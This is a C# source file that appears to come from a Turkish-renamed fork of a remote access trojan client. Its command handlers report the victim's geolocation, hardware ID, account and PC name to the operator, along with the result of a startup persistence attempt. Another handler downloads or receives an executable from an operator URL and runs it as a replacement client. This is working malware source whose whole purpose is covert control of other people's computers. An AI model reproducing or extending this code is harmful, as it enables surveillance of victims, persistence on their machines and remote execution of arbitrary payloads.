using System;
using System.Net;
using System.Threading;
using xClient.Ayarlar;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Kurulum;
using xClient.KuuhakuÇekirdek.Paketler.ClientPaketleri;
using xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri;
using xClient.KuuhakuÇekirdek.Utilityler;
using xClient.KuuhakuÇekirdek.Yardımcılar;

namespace xClient.KuuhakuÇekirdek.Eylemler
{
    public static partial class Eylemİşleyicisi
    {
        public static void HandleGetAuthentication(GetAuthentication command, Client client)
        {
            GeoLocationHelper.Initialize();
            new GetAuthenticationResponse(Settings.VERSION, PlatformYardımcısı.Tamİsim,
                WindowsAccountHelper.GetAccountType(),
                GeoLocationHelper.GeoInfo.Ülke, GeoLocationHelper.GeoInfo.Ülke_Kodu,
                GeoLocationHelper.GeoInfo.Bölge, GeoLocationHelper.GeoInfo.Şehir, GeoLocationHelper.ImageIndex,
                CihazYardımcısı.HardwareId, WindowsAccountHelper.GetName(), SystemHelper.GetPcName(), Settings.TAG)
                .Execute(client);

            if (ClientVerisi.AddToStartupFailed)
            {
                Thread.Sleep(2000);
                new SetStatus("Başlangıca Ekleme Başarısız.").Execute(client);
            }
        }

        public static void HandleDoClientUpdate(DoClientUpdate command, Client client)
        {
            // YARRAK GİBİ UPDATE CODE İNC.
            if (string.IsNullOrEmpty(command.DownloadURL))
            {
                if (!_renamedFiles.ContainsKey(command.ID))
                    _renamedFiles.Add(command.ID, DosyaYardımcısı.TempDosyaDizininiAl(".exe"));

                string filePath = _renamedFiles[command.ID];

                try
                {
                    if (command.CurrentBlock == 0 && !DosyaYardımcısı.ExeValidmiKardeş(command.Block))
                        throw new Exception("EXE Bulunamadı.");

                    FileSplit destFile = new FileSplit(filePath);

                    if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                        throw new Exception(destFile.LastError);

                    if ((command.CurrentBlock + 1) == command.MaxBlocks) // Upload Bitimi
                    {
                        if (_renamedFiles.ContainsKey(command.ID))
                            _renamedFiles.Remove(command.ID);
                        new SetStatus("Yükleniyor...").Execute(client);
                        ClientGüncelleyici.Update(client, filePath);
                    }
                }
                catch (Exception ex)
                {
                    if (_renamedFiles.ContainsKey(command.ID))
                        _renamedFiles.Remove(command.ID);
                    NativeMethods.DeleteFile(filePath);
                    new SetStatus(string.Format("Yükleme Başarısız: {0}", ex.Message)).Execute(client);
                }

                return;
            }

            new Thread(() =>
            {
                new SetStatus("Dosya İndiriliyor...").Execute(client);

                string tempFile = DosyaYardımcısı.TempDosyaDizininiAl(".exe");

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.DownloadURL, tempFile);
                    }
                }
                catch
                {
                    new SetStatus("İndirme Başarısız").Execute(client);
                    return;
                }

                new SetStatus("Yükleniyor...").Execute(client);

                ClientGüncelleyici.Update(client, tempFile);
            }).Start();
        }

        public static void HandleDoClientUninstall(DoClientUninstall command, Client client)
        {
            new SetStatus("Kaldırılıyor...").Execute(client);

            ClientKaldırıcı.Uninstall(client);
        }
    }
}